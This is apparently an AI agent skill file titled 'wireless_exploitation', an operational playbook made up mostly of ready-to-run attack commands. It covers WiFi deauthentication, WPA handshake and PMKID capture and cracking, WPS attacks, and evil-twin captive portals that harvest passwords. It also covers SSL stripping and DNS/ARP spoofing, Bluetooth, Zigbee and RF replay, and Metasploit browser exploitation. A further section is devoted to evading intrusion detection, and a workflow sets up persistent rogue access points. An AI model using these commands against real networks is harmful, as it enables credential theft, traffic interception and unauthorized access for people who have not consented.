---
name: wireless_exploitation
description: Learn WiFi attacks (WPA/WPA2/WPA3), evil twin setups, Bluetooth exploitation, and RF attacks using aircrack-ng, Bettercap, and Kismet with WIDS evasion.
---
# Wireless Exploitation

## When to Use This Skill

- Assessing WiFi network security during penetration tests
- Performing evil twin or rogue access point attacks
- Capturing WPA/WPA2 handshakes or PMKID hashes
- Testing Bluetooth device security
- Exploiting wireless protocols (Zigbee, Z-Wave, RF)
- Conducting wireless man-in-the-middle attacks
- Evading wireless intrusion detection systems

---

## Concepts

### 802.11 Protocol Overview

| Frame Type | Purpose | Attack Relevance |
|------------|---------|------------------|
| Management | Authentication, association, beacons, probes | Deauth attacks, evil twin, KARMA |
| Control | ACK, RTS/CTS, flow control | Timing attacks, jamming |
| Data | Actual payload transmission | Traffic capture, injection |

**Key Management Frames**:
- **Beacon** — AP broadcasts SSID, capabilities (target for impersonation)
- **Probe Request/Response** — Client searches for networks (KARMA exploitation)
- **Authentication** — Open system or shared key exchange
- **Deauthentication** — Forces client disconnection (handshake capture)
- **Association** — Client joins network

### Wireless Security Evolution

| Protocol | Year | Encryption | Key Weakness |
|----------|------|------------|--------------|
| WEP | 1997 | RC4 (40/104-bit) | IV reuse, statistical attacks |
| WPA | 2003 | TKIP (RC4-based) | TKIP vulnerabilities, MIC attacks |
| WPA2 | 2004 | CCMP (AES-128) | 4-way handshake capture, PMKID |
| WPA3 | 2018 | GCMP-256, SAE | Side-channel (Dragonblood), downgrade |

**WPA3 SAE (Dragonfly)** — Replaces PSK with Simultaneous Authentication of Equals. Provides forward secrecy and resistance to offline dictionary attacks. Vulnerable to side-channel timing attacks and downgrade when WPA2 fallback enabled.

### Attack Surface Analysis

1. **Pre-authentication** — Beacon/probe manipulation, deauth, KARMA
2. **Authentication** — Handshake capture, PMKID, brute force
3. **Post-authentication** — MITM, traffic interception, injection
4. **Client-side** — Evil twin, captive portal, credential harvesting

---

## Wireless Reconnaissance

### Adapter Setup

```bash
# Check wireless interface
iwconfig
iw dev

# Enable monitor mode
airmon-ng check kill              # Kill interfering processes
airmon-ng start wlan0             # Creates wlan0mon

# Manual monitor mode
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# Verify injection capability
aireplay-ng -9 wlan0mon
```

### Network Discovery

**Airodump-ng** — Primary scanning tool:
```bash
# Scan all channels (2.4GHz)
airodump-ng wlan0mon

# 5GHz channels
airodump-ng wlan0mon --band a

# All bands
airodump-ng wlan0mon --band abg

# Target specific channel and BSSID
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Filter by encryption
airodump-ng wlan0mon --encrypt wpa2
```

**Output Analysis**:
- **PWR** — Signal strength (higher = closer)
- **Beacons** — Management frames received
- **#Data** — Data packets (activity indicator)
- **CH** — Operating channel
- **ENC/CIPHER/AUTH** — Security configuration
- **STATION** — Connected clients (target for deauth)

**Kismet** — Passive reconnaissance:
```bash
kismet -c wlan0mon

# Web interface: http://localhost:2501
# Features: GPS logging, WIDS detection, pcap export
```

### Client Analysis

```bash
# Monitor for probe requests (reveals client PNL)
airodump-ng wlan0mon --band abg

# Probe requests visible in STATION section
# PROBES column shows SSIDs client seeks
# Useful for KARMA/evil twin targeting
```

---

## WEP Attacks (Legacy)

### PTW Attack (Fast)

```bash
# Capture IVs
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Generate traffic (ARP replay)
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 wlan0mon

# Crack when sufficient IVs collected (~20,000-40,000)
aircrack-ng -z wep_capture*.cap
```

### Fragmentation Attack

```bash
# Obtain PRGA
aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 wlan0mon

# Forge ARP packet
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h CC:DD:EE:FF:00:11 \
  -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp_packet

# Inject and capture
aireplay-ng -2 -r arp_packet wlan0mon
```

---

## WPA/WPA2 Attacks

### 4-Way Handshake Capture

**Method 1: Passive Wait**
```bash
# Monitor target AP with connected clients
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
# Wait for client reconnection (slow but stealthy)
```

**Method 2: Deauthentication Attack**
```bash
# Capture on channel
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# In separate terminal - deauth specific client
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Broadcast deauth (all clients)
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# MDK4 for aggressive deauth
mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF -c 6
```

**Verify Capture**:
```bash
# Check for WPA handshake
aircrack-ng handshake-01.cap
# Or
cowpatty -r handshake-01.cap -c
```

### PMKID Attack (Clientless)

Modern WPA2 attack that doesn't require connected clients:

```bash
# Capture PMKID using hcxdumptool
hcxdumptool -i wlan0mon -o pmkid.pcapng --active_beacon --enable_status=15

# Target specific AP
hcxdumptool -i wlan0mon -o pmkid.pcapng --filtermode=2 \
  --filterlist_ap=AA:BB:CC:DD:EE:FF -c 6

# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Convert handshakes too (mode 22000 handles both)
hcxpcapngtool -o combined.hc22000 -E wordlist pmkid.pcapng
```

**Requirements**: Only works on routers with PMKID caching/roaming enabled. Approximately 60-70% of routers support this.

### Handshake/PMKID Cracking

**Hashcat (GPU-accelerated)**:
```bash
# WPA/WPA2 (mode 22000 - handles both PMKID and EAPOL)
hashcat -m 22000 combined.hc22000 /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 22000 combined.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force (8-char lowercase)
hashcat -m 22000 combined.hc22000 -a 3 ?l?l?l?l?l?l?l?l

# Status
hashcat -m 22000 combined.hc22000 --show
```

**Aircrack-ng (CPU)**:
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# With specific BSSID
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap
```

### WPS Attacks

**Pixie Dust (Offline)**:
```bash
# Check WPS status
wash -i wlan0mon

# Pixie dust attack (fast, offline)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -K 1 -vv

# Bully alternative
bully -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3 wlan0mon
```

**Online Brute Force** (slow, may lock):
```bash
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv -N -d 1
```

### Wifite2 Automated Attacks

```bash
# Scan and select targets interactively
wifite

# Target specific network
wifite --bssid AA:BB:CC:DD:EE:FF

# WPA only, skip WEP/WPS
wifite --wpa --no-wps

# Kill after capturing handshake (no cracking)
wifite --wpa --no-crack

# Specify wordlist
wifite --dict /path/to/wordlist.txt
```

### KRACK Attack (Key Reinstallation)

Tests for CVE-2017-13077 through CVE-2017-13088:
```bash
# Clone and setup
git clone https://github.com/vanhoefm/krackattacks-scripts.git
cd krackattacks-scripts/krackattack

# Test client vulnerability
./krack-test-client.py --help

# Requires specific hostapd configuration
# See repository documentation for full setup
```

**Impact**: Allows decryption and injection on vulnerable clients. Most devices patched by 2018, but legacy systems may remain vulnerable.

---

## WPA3 Attacks

### Dragonblood Vulnerabilities

**Downgrade Attack** — Force WPA2 fallback:
```bash
# If AP supports WPA3-Transition mode (WPA2/WPA3 mixed)
# Deauth clients and present WPA2-only evil twin
# Clients may connect via WPA2, enabling traditional attacks

# Detection: Check beacon for RSN capabilities
# WPA3 uses SAE in AKM suite
```

**Side-Channel Attacks** (timing-based):
```bash
# Tools from researchers
git clone https://github.com/AceCentre/dragonblood-tools.git

# Dragontime - timing attack against MODP groups 22, 23, 24
./dragontime -i wlan0mon -b AA:BB:CC:DD:EE:FF

# Dragonforce - password partitioning from timing data
./dragonforce -i timing_data.txt -w wordlist.txt
```

**Practical Limitations**: Most WPA3 implementations now patched. Focus on:
- Transition mode downgrade to WPA2
- Legacy devices without patches
- Side-channel in specific MODP group configurations

### Best Attack Strategy for WPA3

1. Check if WPA3-Transition mode enabled (WPA2 fallback)
2. If yes, perform WPA2 attack via downgrade
3. If WPA3-only, attempt Dragonblood timing (limited success)
4. Consider physical/social engineering alternatives

---

## Evil Twin Attacks

### Basic Evil Twin with hostapd-mana

**Configuration** (`/etc/hostapd-mana/hostapd.conf`):
```
interface=wlan1
driver=nl80211
ssid=TargetNetwork
hw_mode=g
channel=6
wmm_enabled=0

# Enable KARMA (respond to all probes)
enable_mana=1
mana_loud=0
mana_outfile=/tmp/mana.log
```

**Launch**:
```bash
# Start rogue AP
hostapd-mana /etc/hostapd-mana/hostapd.conf

# DHCP server (separate terminal)
dnsmasq -C /etc/dnsmasq.conf -d

# Deauth legitimate AP clients
aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Evil Twin with Airgeddon

```bash
# Launch airgeddon
airgeddon

# Menu options:
# 2) Put interface in monitor mode
# 7) Evil Twin attacks menu
#   - Evil Twin AP with captive portal
#   - Evil Twin with sslstrip2 + bettercap
#   - Evil Twin with BeEF integration
```

**Features**:
- Automated hostapd + DHCP configuration
- Captive portal credential harvesting
- SSL stripping with bettercap
- BeEF browser exploitation integration
- WPA password verification against handshake

### Evil Twin with Wifiphisher

```bash
# Scan and select target
wifiphisher

# Specific scenario
wifiphisher -aI wlan0 -jI wlan1 -p firmware-upgrade

# Available scenarios:
# - firmware-upgrade (fake router update)
# - oauth-login (social media harvesting)
# - wifi-connect (generic WiFi password prompt)
# - custom templates
```

### Evil Twin with Fluxion

Fluxion captures handshake first, then verifies passwords via captive portal:
```bash
fluxion

# Workflow:
# 1. Scan for targets
# 2. Capture handshake (automatic or existing)
# 3. Create evil twin with captive portal
# 4. Users enter password, verified against handshake
# 5. Attack ends when correct password submitted
```

**Key Advantage**: Password verification ensures captured credential is correct.

### KARMA/MANA Attack Theory

**KARMA**: Responds to all client probe requests as if the rogue AP is every network the client seeks.

**MANA Enhancement**: Tracks probe requests per device, responds specifically to each client's preferred networks.

```bash
# berate-ap with KARMA
berate-ap --interface wlan1 --essid Free_WiFi --mana

# Loud mode (broadcast all probed SSIDs)
berate-ap --interface wlan1 --mana-loud
```

---

## Man-in-the-Middle (Wireless)

### Bettercap Wireless MITM

```bash
# Start bettercap
bettercap -iface wlan1

# Enable WiFi module
wifi.recon on

# View discovered networks
wifi.show

# Deauth attack
set wifi.deauth.silent true
wifi.deauth AA:BB:CC:DD:EE:FF

# After client connects to evil twin, enable MITM
net.recon on
net.sniff on
set net.sniff.local true
set net.sniff.output /tmp/capture.pcap
```

### ARP Spoofing

```bash
# Bettercap ARP poisoning
bettercap -iface wlan1
set arp.spoof.targets 192.168.1.100
arp.spoof on
net.sniff on
```

### SSL Stripping

```bash
# Bettercap with HSTS bypass
bettercap -iface wlan1 -caplet hstshijack/hstshijack

# Manual configuration
set http.proxy.sslstrip true
set net.sniff.verbose true
http.proxy on
net.sniff on
```

### DNS Spoofing

```bash
# Create hosts file
echo "192.168.1.1 *" > /tmp/dns.hosts

# Bettercap
set dns.spoof.domains *
set dns.spoof.address 192.168.1.1
dns.spoof on
```

---

## Bluetooth Attacks

### Bluetooth Reconnaissance

**Standard Tools**:
```bash
# Scan for discoverable devices
hcitool scan

# Inquiry scan with details
hcitool inq

# Device info
hcitool info AA:BB:CC:DD:EE:FF

# Service discovery
sdptool browse AA:BB:CC:DD:EE:FF

# L2CAP ping
l2ping AA:BB:CC:DD:EE:FF
```

**BlueZ Utilities**:
```bash
bluetoothctl
# [bluetooth]# scan on
# [bluetooth]# devices
# [bluetooth]# info AA:BB:CC:DD:EE:FF
```

**Bettercap BLE Module**:
```bash
bettercap
ble.recon on
ble.show

# Enumerate services
ble.enum AA:BB:CC:DD:EE:FF

# Write characteristic
ble.write AA:BB:CC:DD:EE:FF <handle> <hex_data>
```

### Bluetooth Low Energy (BLE) Attacks

**GATT Enumeration**:
```bash
# gatttool interactive mode
gatttool -b AA:BB:CC:DD:EE:FF -I
> connect
> primary          # List services
> characteristics  # List characteristics
> char-read-hnd 0x000c  # Read handle

# Non-interactive
gatttool -b AA:BB:CC:DD:EE:FF --char-read -a 0x000c
gatttool -b AA:BB:CC:DD:EE:FF --char-write-req -a 0x000c -n 01
```

**Ubertooth One BLE Sniffing**:
```bash
# Follow mode (capture new connections)
ubertooth-btle -f -c capture.pcap

# Promiscuous mode (capture existing connections)
ubertooth-btle -p -t AA:BB:CC:DD:EE:FF

# Pipe to Wireshark
ubertooth-btle -f | wireshark -k -i -

# Crack encryption with Crackle
crackle -i capture.pcap -o decrypted.pcap
```

### Classic Bluetooth Attacks

**BlueBorne** (CVE-2017-0781 family):
```bash
# Check vulnerability (requires specific PoC tools)
# Affects Android, Linux, Windows, iOS
# Requires Bluetooth enabled, no pairing needed
# Most systems patched post-2017
```

**KNOB Attack** (Key Negotiation of Bluetooth):
```bash
# Forces low entropy key during pairing
# Allows brute-force of encryption key
# Requires proximity during pairing event
```

---

## Other Wireless Technologies

### Zigbee (KillerBee)

**Hardware**: ApiMote, RZ RAVEN USB, Texas Instruments CC2531

```bash
# Identify available interfaces
zbid

# Scan for networks (channel hopping)
zbstumbler -c 11-26

# Passive capture to Wireshark
zbwireshark -c 15 -f /tmp/zigbee.pcap

# Replay captured packets
zbreplay -c 15 -r capture.pcap

# Network key sniffing (default keys)
zbdump -c 15 -w zigbee_capture.pcap
# Default trust center key: 5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39
```

### Z-Wave

**S0 Downgrade Attack**:
```bash
# Z-Wave uses either S0 (weak) or S2 (strong) security
# S0 key exchange has known vulnerability
# During inclusion, intercept and force S0 negotiation
# Requires specialized hardware (HackRF, Z-Wave stick)
```

### RF Attacks

**HackRF/RTL-SDR**:
```bash
# Analyze RF signals
gqrx  # SDR receiver GUI

# Replay attacks (garage doors, simple remotes)
# 1. Capture signal
hackrf_transfer -r capture.raw -f 315000000 -s 2000000

# 2. Replay
hackrf_transfer -t capture.raw -f 315000000 -s 2000000 -x 40
```

---

## Metasploit Wireless Modules

```
# WiFi auxiliary modules
msf6 > use auxiliary/scanner/http/wireless_interface_detector

# Fake AP for credential capture
msf6 > use auxiliary/server/fakedns
msf6 > use auxiliary/server/capture/http_basic

# Karma attack integration
msf6 > use auxiliary/server/wifi/karma

# Browser autopwn via evil twin
msf6 > use auxiliary/server/browser_autopwn2
```

---

## Evasion Techniques

### WIDS/WIPS Evasion

**Deauthentication Detection Bypass**:
```bash
# Rate-limited deauth (avoid burst detection)
aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF wlan0mon
sleep 30
# Repeat slowly

# MDK4 with controlled timing
mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF -c 6 -s 1

# Target specific clients (less noisy than broadcast)
aireplay-ng -0 2 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

**MAC Randomization**:
```bash
# Change MAC before operations
macchanger -r wlan0mon

# Specific vendor
macchanger -a wlan0mon
```

**Channel Hopping Patterns**:
```bash
# Avoid predictable patterns that WIDS might detect
# Use random channel order during scanning
airodump-ng --channel 6,1,11,3,9 wlan0mon
```

**Power Control**:
```bash
# Reduce transmission power (shorter range, less detection)
iwconfig wlan0mon txpower 5

# Increase only when needed for specific operations
iwconfig wlan0mon txpower 20
```

### Evil Twin Stealth

- Match target AP's beacon interval exactly
- Clone MAC address of target AP
- Use directional antenna toward target clients
- Position to provide stronger signal than legitimate AP
- Disable probe response on rogue AP after clients connect

---

## Workflows

### WiFi Security Assessment Workflow

1. **Reconnaissance**:
   ```bash
   airmon-ng start wlan0
   airodump-ng wlan0mon --band abg -w recon
   ```

2. **Target Selection**: Analyze signal strength, security, connected clients

3. **Attack Selection**:
   - WPA2 with clients → Deauth + handshake capture
   - WPA2 no clients → PMKID attack
   - WPA3-Transition → Downgrade to WPA2
   - WPS enabled → Pixie dust

4. **Credential Capture**:
   ```bash
   # Handshake
   airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w target wlan0mon
   aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

   # Or PMKID
   hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=15
   ```

5. **Crack**:
   ```bash
   hcxpcapngtool -o hashes.hc22000 target-01.cap pmkid.pcapng
   hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt
   ```

### Rogue AP Attack Workflow

1. **Capture Handshake** (for password verification):
   ```bash
   airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon
   aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
   ```

2. **Configure Evil Twin**:
   ```bash
   # Using Fluxion (automated) or manual hostapd-mana
   fluxion
   # Select target, handshake, captive portal attack
   ```

3. **Deauth Legitimate Clients**:
   ```bash
   mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF -c 6
   ```

4. **Harvest Credentials**: Wait for users to enter password in captive portal

5. **Verify and Document**: Captured password validated against handshake

### Bluetooth Assessment Workflow

1. **Discovery**:
   ```bash
   hcitool scan
   bettercap -eval "ble.recon on"
   ```

2. **Service Enumeration**:
   ```bash
   sdptool browse AA:BB:CC:DD:EE:FF
   gatttool -b AA:BB:CC:DD:EE:FF -I
   > primary
   > characteristics
   ```

3. **Sniffing** (requires Ubertooth):
   ```bash
   ubertooth-btle -f -c capture.pcap
   ```

4. **Analysis**: Review captured data for sensitive information, weak pairing

### Multi-Stage Wireless Pivot Workflow

1. **Compromise WiFi** → Gain network access
2. **Internal Reconnaissance** → Discover hosts, services
3. **Pivot to Internal Targets** → Use compromised position
4. **Deploy Persistence** → Rogue AP for continued access

---

## Tool Reference Quick Reference

| Task | Primary Tool | Alternative |
|------|--------------|-------------|
| Monitor mode | airmon-ng | iw dev |
| Network discovery | airodump-ng | Kismet, wash |
| Deauthentication | aireplay-ng | mdk4, bettercap |
| Handshake capture | airodump-ng | hcxdumptool |
| PMKID capture | hcxdumptool | - |
| Hash conversion | hcxpcapngtool | - |
| Cracking | hashcat | aircrack-ng, john |
| WPS attack | reaver | bully |
| Evil twin | hostapd-mana | Fluxion, Wifiphisher |
| Automated attacks | Wifite2 | airgeddon |
| BLE sniffing | Ubertooth | Bettercap BLE |
| MITM | Bettercap | Ettercap |
| Zigbee | KillerBee | - |
